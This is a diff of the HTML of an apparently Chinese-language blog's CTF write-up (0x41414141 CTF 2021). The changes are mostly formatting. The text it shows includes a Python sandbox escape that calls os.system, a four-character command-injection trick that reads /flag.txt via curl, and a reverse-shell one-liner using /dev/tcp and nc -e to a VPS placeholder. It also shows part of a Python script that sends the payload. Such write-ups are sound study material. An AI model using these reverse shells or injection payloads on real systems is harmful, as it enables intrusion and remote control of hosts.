+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">globals</span><span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">'__imp'</span><span class="token string">'ort__'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'o'</span><span class="token string">'s'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">'sy'</span><span class="token string">'stem'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'cat /flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>打远程，得到 flag</p>
 <p><img src="/2021/01/31/CTF_2021_0x41414141/image-20210126212949964.png" alt="image-20210126212949964"></p>
 <blockquote>
@@ -926,12 +926,12 @@ modules<span class="token punctuation">.</span>clear<span class="token punctuati
 <p><a target="_blank" rel="noopener" href="http://45.134.3.200:8000/">US instance</a></p>
 </blockquote>
 <p>访问得到</p>
-<pre class="language-none"><code class="language-none">use arg cmd for running a command and arg ?reset for clearing the env</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">use arg cmd for running a command and arg ?reset for clearing the env<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><strong>只允许4个字符的命令执行</strong>，唔，挺熟悉的题目，甚至有原题。</p>
 <p>比如 <em>HITCON 2017 CTF BabyFirst Revenge</em>，这个网上巨多 WriteUp。</p>
 <p>这个 server 是 gunicorn/19.7.1，应该是 python 起的吧。</p>
 <p>先来看看 当前目录以及目录下有啥。</p>
-<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># curl  "http://207.180.200.166:8000/?cmd=pwd"</span>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># curl  "http://207.180.200.166:8000/?cmd=pwd"</span>
 /home/ctf/code/sandbox/22229031
 <span class="token comment"># curl  "http://207.180.200.166:8000/?cmd=pwd"</span>
 <span class="token comment"># curl  "http://207.180.200.166:8000/?cmd=ls%20/"</span>
@@ -951,7 +951,7 @@ srv
 sys
 tmp
 usr
-var</code></pre>
+var<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>可见在沙箱里，当前目录下么得东西，flag 在根目录下。</p>
 <p>那么就需要执行 <code>cat /flag.txt</code>，或者简略一点，<code>cat /f*</code>.</p>
 <p>然而，不能生成带有 <code>/</code> 的文件名，还是得以命令的形式来执行。</p>
@@ -960,9 +960,9 @@ var</code></pre>
 <p><img src="/2021/01/31/CTF_2021_0x41414141/image-20210131225509319.png" alt="trick"></p>
 <p>于是先生成一个 名为 <code>cat</code> 的文件，然后再用 <code>*+参数</code> 就能执行命令了。</p>
 <p><strong>Payload：</strong></p>
-<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># curl "http://207.180.200.166:8000/?cmd=&gt;cat"</span>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># curl "http://207.180.200.166:8000/?cmd=&gt;cat"</span>
 <span class="token comment"># curl "http://207.180.200.166:8000/?cmd=*%20/f*"</span>
-flag<span class="token punctuation">{</span>ju57_g0tt@_5pl1t_Em3012<span class="token punctuation">}</span></code></pre>
+flag<span class="token punctuation">{</span>ju57_g0tt@_5pl1t_Em3012<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>就能得到 flag 了~</p>
 <p><code>flag{ju57_g0tt@_5pl1t_Em3012}</code></p>
 <br>
@@ -971,10 +971,10 @@ flag<span class="token punctuation">{</span>ju57_g0tt@_5pl1t_Em3012<span class="
 <p><img src="/2021/01/31/CTF_2021_0x41414141/image-20210131230800817.png" alt="本地执行命令"></p>
 <p><img src="/2021/01/31/CTF_2021_0x41414141/image-20210131231038304.png" alt="vps上拿到shell"></p>
 <p>VPS 上起一个 web 服务，内容为</p>
-<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">&gt;&amp;</span> /dev/tcp/VPSIP/PORT <span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>
-<span class="token comment"># 或者 nc -e /bin/sh VPSIP PORT</span></code></pre>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">&gt;&amp;</span> /dev/tcp/VPSIP/PORT <span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>
+<span class="token comment"># 或者 nc -e /bin/sh VPSIP PORT</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p><strong>payload:</strong></p>
-<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># coding: utf-8</span>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding: utf-8</span>
 <span class="token keyword">import</span> requests
 <span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quote
 
@@ -1040,7 +1040,7 @@ r<span class="token punctuation">.</span>encoding <span class="token operator">=
 r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>baseurl<span class="token operator">+</span>quote<span class="token punctuation">(</span><span class="token string">"sh g"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
 r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span>
 <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'==&gt;'</span><span class="token punctuation">,</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
-s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>reset<span class="token punctuation">)</span></code></pre>
+s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>reset<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>BTW, 还有<strong>其他的 trick</strong>，来总结了一下，放到下面这篇博客里了。</p>
 <p><a href="https://miaotony.xyz/2021/01/31/CTF_web_CommandExecutionLimitedLength/">CTF | 限制长度下的命令执行 技巧汇总</a></p>
 <blockquote>
